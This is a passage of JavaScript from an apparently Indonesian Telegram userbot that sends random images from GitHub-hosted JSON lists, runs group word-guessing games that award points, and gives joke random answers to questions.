    msg.text?.startsWith(`${prefix}cosplaysagiri`) || msg.text?.startsWith(`${prefix}cyber`) || msg.text?.startsWith(`${prefix}deidara`) || 
    msg.text?.startsWith(`${prefix}doraemon`) || msg.text?.startsWith(`${prefix}elaina`) || msg.text?.startsWith(`${prefix}emilia`) || 
    msg.text?.startsWith(`${prefix}erza`) || msg.text?.startsWith(`${prefix}exo`) || msg.text?.startsWith(`${prefix}gamewallpaper`) || 
    msg.text?.startsWith(`${prefix}gremory`) || msg.text?.startsWith(`${prefix}hacker`) || msg.text?.startsWith(`${prefix}hestia`) || 
    msg.text?.startsWith(`${prefix}hinata`) || msg.text?.startsWith(`${prefix}husbu`) || msg.text?.startsWith(`${prefix}inori`) || 
    msg.text?.startsWith(`${prefix}islamic`) || msg.text?.startsWith(`${prefix}isuzu`) || msg.text?.startsWith(`${prefix}itachi`) || 
    msg.text?.startsWith(`${prefix}itori`) || msg.text?.startsWith(`${prefix}jennie`) || msg.text?.startsWith(`${prefix}jiso`) || 
    msg.text?.startsWith(`${prefix}justina`) || msg.text?.startsWith(`${prefix}kaga`) || msg.text?.startsWith(`${prefix}kagura`) || 
    msg.text?.startsWith(`${prefix}kakasih`) || msg.text?.startsWith(`${prefix}kaori`) || msg.text?.startsWith(`${prefix}keneki`) || 
    msg.text?.startsWith(`${prefix}kotori`) || msg.text?.startsWith(`${prefix}kurumi`) || msg.text?.startsWith(`${prefix}lisa`) || 
    msg.text?.startsWith(`${prefix}madara`) || msg.text?.startsWith(`${prefix}megumin`) || msg.text?.startsWith(`${prefix}mikasa`) || 
    msg.text?.startsWith(`${prefix}mikey`) || msg.text?.startsWith(`${prefix}miku`) || msg.text?.startsWith(`${prefix}minato`) || 
    msg.text?.startsWith(`${prefix}mountain`) || msg.text?.startsWith(`${prefix}naruto`) || msg.text?.startsWith(`${prefix}neko2`) || 
    msg.text?.startsWith(`${prefix}nekonime`) || msg.text?.startsWith(`${prefix}nezuko`) || msg.text?.startsWith(`${prefix}onepiece`) || 
    msg.text?.startsWith(`${prefix}pentol`) || msg.text?.startsWith(`${prefix}pokemon`) || msg.text?.startsWith(`${prefix}programming`) || 
    msg.text?.startsWith(`${prefix}randomnime`) || msg.text?.startsWith(`${prefix}randomnime2`) || msg.text?.startsWith(`${prefix}rize`) || 
    msg.text?.startsWith(`${prefix}rose`) || msg.text?.startsWith(`${prefix}sagiri`) || msg.text?.startsWith(`${prefix}sakura`) || 
    msg.text?.startsWith(`${prefix}sasuke`) || msg.text?.startsWith(`${prefix}satanic`) || msg.text?.startsWith(`${prefix}shina`) || 
    msg.text?.startsWith(`${prefix}shinka`) || msg.text?.startsWith(`${prefix}shinomiya`) || msg.text?.startsWith(`${prefix}shizuka`) || 
    msg.text?.startsWith(`${prefix}shota`) || msg.text?.startsWith(`${prefix}shortquote`) || msg.text?.startsWith(`${prefix}space`) || 
    msg.text?.startsWith(`${prefix}technology`) || msg.text?.startsWith(`${prefix}tejina`) || msg.text?.startsWith(`${prefix}toukachan`) || 
    msg.text?.startsWith(`${prefix}tsunade`) || msg.text?.startsWith(`${prefix}yotsuba`) || msg.text?.startsWith(`${prefix}yuki`) || 
    msg.text?.startsWith(`${prefix}yulibocil`) || msg.text?.startsWith(`${prefix}yumeko`)) {
  
  const command = msg.text.split(" ")[0].replace(prefix, "").toLowerCase();
  
  // Kirim pesan loading
  const loadingMsg = await client.sendMessage(msg.chatId, { 
    message: `<blockquote>🔄 ᴍᴇᴍᴘʀᴏꜱᴇꜱ ${command}...</blockquote>`, 
    parseMode: "html", 
    replyTo: msg.id 
  });
  
  // Mapping command ke URL
  const urlMap = {
    'akiyama': 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/akiyama.json',
    'ana': 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/ana.json',
    'art': 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/art.json',
    'asuna': 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/asuna.json',
    'ayuzawa': 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/ayuzawa.json',
    'boruto': 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/boruto.json',
    'bts': 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/bts.json',
    'cartoon': 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/kartun.json',
    'chiho': 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/chiho.json',
    'chitoge': 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/chitoge.json',
    'cosplay': 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/cosplay.json',
    'cosplayloli': 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/cosplayloli.json',
    'cosplaysagiri': 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/cosplaysagiri.json',
    'cyber': 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/cyber.json',
    'deidara': 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/deidara.json',
    'doraemon': 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/doraemon.json',
    'elaina': 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/elaina.json',
    'emilia': 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/emilia.json',
    'erza': 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/erza.json',
    'exo': 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/exo.json',
    'gamewallpaper': 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/gamewallpaper.json',
    'gremory': 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/gremory.json',
    'hacker': 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/hekel.json',
    'hestia': 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/hestia.json',
    'hinata': 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/hinata.json',
    'husbu': 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/husbu.json',
    'inori': 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/inori.json',
    'islamic': 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/islamic.json',
    'isuzu': 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/isuzu.json',
    'itachi': 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/itachi.json',
    'itori': 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/itori.json',
    'jennie': 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/jeni.json',
    'jiso': 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/jiso.json',
    'justina': 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/justina.json',
    'kaga': 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/kaga.json',
    'kagura': 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/kagura.json',
    'kakasih': 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/kakasih.json',
    'kaori': 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/kaori.json',
    'keneki': 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/keneki.json',
    'kotori': 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/kotori.json',
    'kurumi': 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/kurumi.json',
    'lisa': 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/lisa.json',
    'madara': 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/madara.json',
    'megumin': 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/megumin.json',
    'mikasa': 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/mikasa.json',
    'mikey': 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/mikey.json',
    'miku': 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/miku.json',
    'minato': 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/minato.json',
    'mountain': 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/mountain.json',
    'naruto': 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/naruto.json',
    'neko2': 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/neko2.json',
    'nekonime': 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/nekonime.json',
    'nezuko': 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/nezuko.json',
    'onepiece': 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/onepiece.json',
    'pentol': 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/pentol.json',
    'pokemon': 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/pokemon.json',
    'programming': 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/programming.json',
    'randomnime': 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/randomnime.json',
    'randomnime2': 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/randomnime2.json',
    'rize': 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/rize.json',
    'rose': 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/rose.json',
    'sagiri': 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/sagiri.json',
    'sakura': 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/sakura.json',
    'sasuke': 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/sasuke.json',
    'satanic': 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/satanic.json',
    'shina': 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/shina.json',
    'shinka': 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/shinka.json',
    'shinomiya': 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/shinomiya.json',
    'shizuka': 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/shizuka.json',
    'shota': 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/shota.json',
    'shortquote': 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/katakata.json',
    'space': 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/tatasurya.json',
    'technology': 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/technology.json',
    'tejina': 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/tejina.json',
    'toukachan': 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/toukachan.json',
    'tsunade': 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/tsunade.json',
    'yotsuba': 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/yotsuba.json',
    'yuki': 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/yuki.json',
    'yulibocil': 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/yulibocil.json',
    'yumeko': 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/yumeko.json'
  };
  
  const url = urlMap[command];
  
  if (!url) {
    await client.sendMessage(msg.chatId, { 
      message: `<blockquote>❌ ᴄᴏᴍᴍᴀɴᴅ ${command} ᴛɪᴅᴀᴋ ᴅɪᴛᴇᴍᴜᴋᴀɴ!</blockquote>`, 
      parseMode: "html", 
      replyTo: msg.id 
    });
    await client.deleteMessages(msg.chatId, [loadingMsg.id], { revoke: true }).catch(() => {});
    return;
  }
  
  try {
    const response = await fetch(url);
    const heyy = await response.json();
    
    if (!heyy || heyy.length === 0) {
      await client.sendMessage(msg.chatId, { 
        message: `<blockquote>❌ ᴛɪᴅᴀᴋ ᴀᴅᴀ ɢᴀᴍʙᴀʀ ᴜɴᴛᴜᴋ ${command}</blockquote>`, 
        parseMode: "html", 
        replyTo: msg.id 
      });
      await client.deleteMessages(msg.chatId, [loadingMsg.id], { revoke: true }).catch(() => {});
      return;
    }
    
    let yeha = heyy[Math.floor(Math.random() * heyy.length)];
    
    // Hapus loading message
    await client.deleteMessages(msg.chatId, [loadingMsg.id], { revoke: true }).catch(() => {});
    
    // Kirim gambar
    await client.sendMessage(msg.chatId, {
      message: yeha,
      parseMode: "html",
      replyTo: msg.id
    });
    
  } catch (error) {
    console.error(error);
    await client.deleteMessages(msg.chatId, [loadingMsg.id], { revoke: true }).catch(() => {});
    await client.sendMessage(msg.chatId, { 
      message: `<blockquote>❌ ɢᴀɢᴀʟ ᴍᴇɴɢᴀᴍʙɪʟ ɢᴀᴍʙᴀʀ: ${error.message}</blockquote>`, 
      parseMode: "html", 
      replyTo: msg.id 
    });
  }
  return;
}

// ==================== GAME SYSTEM ====================
// Pastikan variabel gamewaktu sudah didefinisikan
const gamewaktu = 30; // 30 detik

// Helper function monospace jika belum ada
function monospace(str) {
    return `\`${str}\``;
}

// CEK JAWABAN GAME - TEBAK KATA
if (global.tebakkata && global.tebakkata.soal) {
    let { soal, jawaban, waktu, chatId } = global.tebakkata
    if (msg.chatId === chatId && msg.body?.toLowerCase().includes(jawaban)) {
        await reply(`Selamat Jawaban Kamu Benar🥳\n\nSoal:\n${monospace(soal)}\nJawaban: ${jawaban}\n*kamu mendapatkan 20 limit*`)
        clearTimeout(waktu)
        const user = global.db.users[m.sender]
        user.limit = (user.limit || 0) + 20
        delete global.tebakkata
    }
}

// CEK JAWABAN GAME - ASAH OTAK
if (global.asahotak && global.asahotak.soal) {
    let { soal, jawaban, waktu, chatId } = global.asahotak
    if (msg.chatId === chatId && msg.body?.toLowerCase().includes(jawaban)) {
        await reply(`Selamat Jawaban Kamu Benar🥳\n\nSoal:\n${monospace(soal)}\nJawaban: ${jawaban}\n*kamu mendapatkan 20 limit*`)
        clearTimeout(waktu)
        const user = global.db.users[m.sender]
        user.limit = (user.limit || 0) + 20
        delete global.asahotak
    }
}

// CEK JAWABAN GAME - SUSUN KATA
if (global.susunkata && global.susunkata.soal) {
    let { soal, jawaban, waktu, chatId } = global.susunkata
    if (msg.chatId === chatId && msg.body?.toLowerCase().includes(jawaban)) {
        await reply(`Selamat Jawaban Kamu Benar🥳\n\nSoal:\n${monospace(soal)}\nJawaban: ${jawaban}\n*kamu mendapatkan 20 limit*`)
        clearTimeout(waktu)
        const user = global.db.users[m.sender]
        user.limit = (user.limit || 0) + 20
        delete global.susunkata
    }
}

// CEK JAWABAN GAME - TEBAK GAMBAR
if (global.tebakgambar && global.tebakgambar.soal) {
    let { soal, jawaban, waktu, chatId } = global.tebakgambar
    if (msg.chatId === chatId && msg.body?.toLowerCase().includes(jawaban)) {
        await reply(`Selamat Jawaban Kamu Benar🥳\n\nJawaban: ${jawaban}\n*kamu mendapatkan 20 limit*`)
        clearTimeout(waktu)
        const user = global.db.users[m.sender]
        user.limit = (user.limit || 0) + 20
        delete global.tebakgambar
    }
}

// CEK JAWABAN GAME - TEBAK BENDERA
if (global.tebakbendera && global.tebakbendera.soal) {
    let { soal, jawaban, waktu, chatId } = global.tebakbendera
    if (msg.chatId === chatId && msg.body?.toLowerCase().includes(jawaban)) {
        await reply(`Selamat Jawaban Kamu Benar🥳\n\nSoal:\n${monospace(soal)}\nJawaban: ${jawaban}\n*kamu mendapatkan 20 limit*`)
        clearTimeout(waktu)
        const user = global.db.users[m.sender]
        user.limit = (user.limit || 0) + 20
        delete global.tebakbendera
    }
}

// CEK JAWABAN GAME - TEBAK KIMIA
if (global.tebakkimia && global.tebakkimia.soal) {
    let { soal, jawaban, waktu, chatId } = global.tebakkimia
    if (msg.chatId === chatId && msg.body?.toLowerCase().includes(jawaban)) {
        await reply(`Selamat Jawaban Kamu Benar🥳\n\nSoal:\n${monospace(soal)}\nJawaban: ${jawaban}\n*kamu mendapatkan 20 limit*`)
        clearTimeout(waktu)
        const user = global.db.users[m.sender]
        user.limit = (user.limit || 0) + 20
        delete global.tebakkimia
    }
}

// CEK JAWABAN GAME - FAMILY 100 (dengan multiple answers)
if (global.family && global.family.soal) {
    let { soal, jawabanList, waktu, chatId, answered } = global.family
    if (msg.chatId === chatId && msg.body) {
        const userAnswer = msg.body.toLowerCase()
        let found = false
        
        for (let i of jawabanList) {
            if (userAnswer.includes(i) && !answered.includes(i)) {
                answered.push(i)
                found = true
                await reply(`*GAME FAMILY 100*\n\nJawaban kamu benar!\nJawaban: ${i}\nSisa jawaban: ${jawabanList.length - answered.length}\n*kamu mendapatkan 20 limit*`)
                
                const user = global.db.users[m.sender]
                user.limit = (user.limit || 0) + 20
                break
            }
        }
        
        // Jika semua jawaban sudah terjawab
        if (answered.length === jawabanList.length) {
            await reply(`🎉 *SELAMAT!* 🎉\n\nSemua jawaban untuk "${soal}" telah terjawab!\nTotal jawaban: ${jawabanList.length}`)
            clearTimeout(waktu)
            delete global.family
        }
    }
}

// ==================== START GAME COMMANDS ====================

// CASE TEBAK KATA
if (msg.text?.startsWith(`${prefix}tebakkata`)) {
    if (!msg.isGroup) {
        await client.sendMessage(msg.chatId, { message: `<blockquote>❌ Command ini hanya untuk group!</blockquote>`, parseMode: "html", replyTo: msg.id });
        return;
    }
    
    const fs = require("fs");
    const data = require('../Game/tebakkata.json');
    const { soal, jawaban } = data[Math.floor(Math.random() * data.length)];
    console.log('Jawaban : ' + jawaban);
    
    const petunjuk = jawaban.toLowerCase().replace(/[bcdfghjklmnpqrstvwxyz]/gi, '-');
    
    await client.sendMessage(msg.chatId, { 
        message: `<blockquote>🎮 *GAME TEBAK KATA* 🎮\n\n📝 *Soal:* ${soal}\n🔍 *Petunjuk:* ${petunjuk}\n⏰ *Waktu:* ${gamewaktu} detik</blockquote>`, 
        parseMode: "html", 
        replyTo: msg.id 
    });
    
    global.tebakkata = {
        soal: soal,
        jawaban: jawaban.toLowerCase(),
        chatId: msg.chatId,
        msgId: msg.id,
        waktu: setTimeout(() => {
            if (global.tebakkata) {
                client.sendMessage(msg.chatId, { 
                    message: `<blockquote>⏰ *WAKTU HABIS!*\n\n📝 *Soal:* ${soal}\n✅ *Jawaban:* ${jawaban}</blockquote>`, 
                    parseMode: "html" 
                });
                delete global.tebakkata;
            }
        }, gamewaktu * 1000)
    };
    return;
}

// CASE ASAH OTAK
if (msg.text?.startsWith(`${prefix}asahotak`)) {
    if (!msg.isGroup) {
        await client.sendMessage(msg.chatId, { message: `<blockquote>❌ Command ini hanya untuk group!</blockquote>`, parseMode: "html", replyTo: msg.id });
        return;
    }
    
    const fs = require("fs");
    const data = require('../Game/asahotak.json');
    const { soal, jawaban } = data[Math.floor(Math.random() * data.length)];
    console.log('Jawaban : ' + jawaban);
    
    const petunjuk = jawaban.toLowerCase().replace(/[bcdfghjklmnpqrstvwxyz]/gi, '-');
    
    await client.sendMessage(msg.chatId, { 
        message: `<blockquote>🧠 *GAME ASAH OTAK* 🧠\n\n📝 *Soal:* ${soal}\n🔍 *Petunjuk:* ${petunjuk}\n⏰ *Waktu:* ${gamewaktu} detik</blockquote>`, 
        parseMode: "html", 
        replyTo: msg.id 
    });
    
    global.asahotak = {
        soal: soal,
        jawaban: jawaban.toLowerCase(),
        chatId: msg.chatId,
        msgId: msg.id,
        waktu: setTimeout(() => {
            if (global.asahotak) {
                client.sendMessage(msg.chatId, { 
                    message: `<blockquote>⏰ *WAKTU HABIS!*\n\n📝 *Soal:* ${soal}\n✅ *Jawaban:* ${jawaban}</blockquote>`, 
                    parseMode: "html" 
                });
                delete global.asahotak;
            }
        }, gamewaktu * 1000)
    };
    return;
}

// CASE SUSUN KATA
if (msg.text?.startsWith(`${prefix}susunkata`)) {
    if (!msg.isGroup) {
        await client.sendMessage(msg.chatId, { message: `<blockquote>❌ Command ini hanya untuk group!</blockquote>`, parseMode: "html", replyTo: msg.id });
        return;
    }
    
    const fs = require("fs");
    const data = require('../Game/susunkata.json');
    const { soal, jawaban } = data[Math.floor(Math.random() * data.length)];
    console.log('Jawaban : ' + jawaban);
    
    const petunjuk = jawaban.toLowerCase().replace(/[bcdfghjklmnpqrstvwxyz]/gi, '-');
    
    await client.sendMessage(msg.chatId, { 
        message: `<blockquote>🔤 *GAME SUSUN KATA* 🔤\n\n📝 *Soal:* ${soal}\n🔍 *Petunjuk:* ${petunjuk}\n⏰ *Waktu:* ${gamewaktu} detik</blockquote>`, 
        parseMode: "html", 
        replyTo: msg.id 
    });
    
    global.susunkata = {
        soal: soal,
        jawaban: jawaban.toLowerCase(),
        chatId: msg.chatId,
        msgId: msg.id,
        waktu: setTimeout(() => {
            if (global.susunkata) {
                client.sendMessage(msg.chatId, { 
                    message: `<blockquote>⏰ *WAKTU HABIS!*\n\n📝 *Soal:* ${soal}\n✅ *Jawaban:* ${jawaban}</blockquote>`, 
                    parseMode: "html" 
                });
                delete global.susunkata;
            }
        }, gamewaktu * 1000)
    };
    return;
}

// CASE TEBAK GAMBAR
if (msg.text?.startsWith(`${prefix}tebakgambar`)) {
    if (!msg.isGroup) {
        await client.sendMessage(msg.chatId, { message: `<blockquote>❌ Command ini hanya untuk group!</blockquote>`, parseMode: "html", replyTo: msg.id });
        return;
    }
    
    const fs = require("fs");
    const data = require('../Game/tebakgambar.json');
    const { img, jawaban, deskripsi } = data[Math.floor(Math.random() * data.length)];
    console.log('Jawaban : ' + jawaban);
    
    const petunjuk = jawaban.toLowerCase().replace(/[bcdfghjklmnpqrstvwxyz]/gi, '-');
    const teks = `<blockquote>🖼️ *GAME TEBAK GAMBAR* 🖼️\n\n🔍 *Petunjuk:* ${petunjuk}\n📝 *Deskripsi:* ${deskripsi}\n⏰ *Waktu:* ${gamewaktu} detik</blockquote>`;
    
    await client.sendMessage(msg.chatId, {
        message: img,
        caption: teks,
        parseMode: "html",
        replyTo: msg.id
    });
    
    global.tebakgambar = {
        soal: img,
        jawaban: jawaban.toLowerCase(),
        chatId: msg.chatId,
        msgId: msg.id,
        waktu: setTimeout(() => {
            if (global.tebakgambar) {
                client.sendMessage(msg.chatId, { 
                    message: `<blockquote>⏰ *WAKTU HABIS!*\n✅ *Jawaban:* ${jawaban}</blockquote>`, 
                    parseMode: "html" 
                });
                delete global.tebakgambar;
            }
        }, gamewaktu * 1000)
    };
    return;
}

// CASE TEBAK BENDERA
if (msg.text?.startsWith(`${prefix}tebakbendera`)) {
    if (!msg.isGroup) {
        await client.sendMessage(msg.chatId, { message: `<blockquote>❌ Command ini hanya untuk group!</blockquote>`, parseMode: "html", replyTo: msg.id });
        return;
    }
    
    const fs = require("fs");
    const data = require('../Game/tebakbendera.json');
    const { soal, jawaban } = data[Math.floor(Math.random() * data.length)];
    console.log('Jawaban : ' + jawaban);
    
    const petunjuk = jawaban.toLowerCase().replace(/[bcdfghjklmnpqrstvwxyz]/gi, '-');
    
    await client.sendMessage(msg.chatId, { 
        message: `<blockquote>🏳️ *GAME TEBAK BENDERA* 🏳️\n\n📝 *Soal:* ${soal}\n🔍 *Petunjuk:* ${petunjuk}\n⏰ *Waktu:* ${gamewaktu} detik</blockquote>`, 
        parseMode: "html", 
        replyTo: msg.id 
    });
    
    global.tebakbendera = {
        soal: soal,
        jawaban: jawaban.toLowerCase(),
        chatId: msg.chatId,
        msgId: msg.id,
        waktu: setTimeout(() => {
            if (global.tebakbendera) {
                client.sendMessage(msg.chatId, { 
                    message: `<blockquote>⏰ *WAKTU HABIS!*\n\n📝 *Soal:* ${soal}\n✅ *Jawaban:* ${jawaban}</blockquote>`, 
                    parseMode: "html" 
                });
                delete global.tebakbendera;
            }
        }, gamewaktu * 1000)
    };
    return;
}

// CASE TEBAK KIMIA
if (msg.text?.startsWith(`${prefix}tebakkimia`)) {
    if (!msg.isGroup) {
        await client.sendMessage(msg.chatId, { message: `<blockquote>❌ Command ini hanya untuk group!</blockquote>`, parseMode: "html", replyTo: msg.id });
        return;
    }
    
    const fs = require("fs");
    const data = require('../Game/tebakkimia.json');
    const { soal, jawaban } = data[Math.floor(Math.random() * data.length)];
    console.log('Jawaban : ' + jawaban);
    
    const petunjuk = jawaban.toLowerCase().replace(/[bcdfghjklmnpqrstvwxyz]/gi, '-');
    
    await client.sendMessage(msg.chatId, { 
        message: `<blockquote>🧪 *GAME TEBAK KIMIA* 🧪\n\n📝 *Soal:* ${soal}\n🔍 *Petunjuk:* ${petunjuk}\n⏰ *Waktu:* ${gamewaktu} detik</blockquote>`, 
        parseMode: "html", 
        replyTo: msg.id 
    });
    
    global.tebakkimia = {
        soal: soal,
        jawaban: jawaban.toLowerCase(),
        chatId: msg.chatId,
        msgId: msg.id,
        waktu: setTimeout(() => {
            if (global.tebakkimia) {
                client.sendMessage(msg.chatId, { 
                    message: `<blockquote>⏰ *WAKTU HABIS!*\n\n📝 *Soal:* ${soal}\n✅ *Jawaban:* ${jawaban}</blockquote>`, 
                    parseMode: "html" 
                });
                delete global.tebakkimia;
            }
        }, gamewaktu * 1000)
    };
    return;
}

// CASE FAMILY 100
if (msg.text?.startsWith(`${prefix}family100`) || msg.text?.startsWith(`${prefix}f100`)) {
    if (!msg.isGroup) {
        await client.sendMessage(msg.chatId, { message: `<blockquote>❌ Command ini hanya untuk group!</blockquote>`, parseMode: "html", replyTo: msg.id });
        return;
    }
    
    const fs = require("fs");
    const data = require('../Game/family100.json');
    const { soal, jawaban } = data[Math.floor(Math.random() * data.length)];
    console.log('Jawaban : ' + jawaban);
    
    // Format jawaban
    let famil = [];
    for (let i of jawaban) {
        let fefsh = i.split('/') ? i.split('/')[0] : i;
        let iuhbs = fefsh.startsWith(' ') ? fefsh.replace(' ', '') : fefsh;
        let axsfh = iuhbs.endsWith(' ') ? iuhbs.slice(0, -1) : iuhbs;
        famil.push(axsfh.toLowerCase());
    }
    
    await client.sendMessage(msg.chatId, { 
        message: `<blockquote>👨‍👩‍👧‍👦 *GAME FAMILY 100* 👨‍👩‍👧‍👦\n\n📝 *Soal:* ${soal}\n📊 *Total Jawaban:* ${jawaban.length}\n⏰ *Waktu:* ${gamewaktu} detik</blockquote>`, 
        parseMode: "html", 
        replyTo: msg.id 
    });
    
    global.family = {
        soal: soal,
        jawabanList: famil,
        answered: [],
        chatId: msg.chatId,
        msgId: msg.id,
        waktu: setTimeout(async () => {
            if (global.family) {
                let teks = `⏰ *WAKTU HABIS!*\n📝 *Jawaban yang belum terjawab:*\n\n`;
                let jwb = global.family.jawabanList;
                let answeredList = global.family.answered;
                for (let i of jwb) {
                    if (!answeredList.includes(i)) {
                        teks += `▪️ ${i}\n`;
                    }
                }
                client.sendMessage(msg.chatId, { 
                    message: `<blockquote>${teks}</blockquote>`, 
                    parseMode: "html" 
                });
                delete global.family;
            }
        }, gamewaktu * 1000)
    };
    return;
}

// Case bisakah
if (msg.text?.startsWith(`${prefix}bisakah`)) {
  const text = msg.text.replace(`${prefix}bisakah`, "").trim();
  
  if (!text) {
    await client.sendMessage(msg.chatId, { message: `<blockquote>⚠️ ᴄᴏɴᴛᴏʜ: ${prefix}bisakah ꜱᴀʏᴀ ᴊᴀᴅɪ ᴋᴀʏᴀ?</blockquote>`, parseMode: "html", replyTo: msg.id });
    return;
  }
  
  const jawaban = ['Bɪꜱᴀ ʙᴀɴɢᴇᴛ', 'Bɪꜱᴀ', 'Mᴜɴɢᴋɪɴ ʙɪꜱᴀ', 'Mᴜɴɢᴋɪɴ', 'Gᴀᴋ ʙɪꜱᴀ', 'Mᴜɴɢᴋɪɴ ɢᴀᴋ ʙɪꜱᴀ', 'Gᴀᴋ ʙɪꜱᴀ ʟᴀʜ', 'Gᴀᴋ ᴛᴀᴜ'];
  const coli = jawaban[Math.floor(Math.random() * jawaban.length)];
  
  await client.sendMessage(msg.chatId, { 
    message: `<blockquote>📝 *ᴘᴇʀᴛᴀɴʏᴀᴀɴ:* ʙɪꜱᴀᴋᴀʜ ${text}\n💬 *ᴊᴀᴡᴀʙᴀɴ:* ${coli}</blockquote>`, 
    parseMode: "html", 
    replyTo: msg.id 
  });
  return;
}

// Case kapankah
if (msg.text?.startsWith(`${prefix}kapankah`)) {
  const text = msg.text.replace(`${prefix}kapankah`, "").trim();
  
  if (!text) {
    await client.sendMessage(msg.chatId, { message: `<blockquote>⚠️ ᴄᴏɴᴛᴏʜ: ${prefix}kapankah ꜱᴀʏᴀ ᴋᴀʏᴀ?</blockquote>`, parseMode: "html", replyTo: msg.id });
    return;
  }
  
  const jawabanWaktu = [
    'Bᴇɴᴛᴀʀ ʟᴀɢɪ',
    'Nᴜɴɢɢᴜ ᴋɪᴀᴍᴀᴛ ᴅᴜʟᴜ',
    'Kᴀᴘᴀɴ-ᴋᴀᴘᴀɴ',
    'Bᴇꜱᴏᴋ',
    'Pᴀꜱ ʟᴜ ᴛɪᴅᴜʀ',
    'Gᴡ ᴊᴜɢᴀ ɢᴀᴋ ᴛᴀᴜ ᴋᴀᴘᴀɴ'
  ];
  const waktuRandom = Math.floor(Math.random() * 10) + 1;
  const unitWaktu = ['ᴍɪɴɢɢᴜ', 'ʙᴜʟᴀɴ', 'ᴛᴀʜᴜɴ'];
  const unitWaktuRandom = unitWaktu[Math.floor(Math.random() * unitWaktu.length)];
  const jawaban = [...jawabanWaktu, `${waktuRandom} ${unitWaktuRandom} ʟᴀɢɪ`];
  const hasilJawaban = jawaban[Math.floor(Math.random() * jawaban.length)];
  
  await client.sendMessage(msg.chatId, { 
    message: `<blockquote>📝 *ᴘᴇʀᴛᴀɴʏᴀᴀɴ:* ᴋᴀᴘᴀɴᴋᴀʜ ${text}\n💬 *ᴊᴀᴡᴀʙᴀɴ:* ${hasilJawaban}</blockquote>`, 
    parseMode: "html", 
    replyTo: msg.id 
  });
  return;
}

// Case cekganteng - perlu fungsi randomNomor
const randomNomor = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min;

if (msg.text?.startsWith(`${prefix}cekganteng`)) {
  let pushname = msg.text.replace(`${prefix}cekganteng`, "").trim();
  
  if (!pushname) {
